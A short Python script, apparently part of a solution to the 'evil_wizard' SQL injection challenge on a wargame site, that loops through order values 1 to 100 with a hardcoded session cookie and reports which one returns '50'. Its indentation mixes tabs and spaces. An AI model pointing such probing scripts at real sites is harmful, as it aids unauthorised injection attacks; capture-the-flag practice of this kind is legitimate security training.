import requests

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order="
session = {'PHPSESSID':'1pnndupij0939bhhc7o1etb71b'}
payload2 = ""


for i in range(1,101):
        payload=str(i)
        #print(str(i)+" payload = "+url+payload)
        
        request = requests.post(url+payload, cookies=session)
        if "50" in request.text:
		print("Find!! : "+str(i))
        else:
            continue


print("Finish!!")

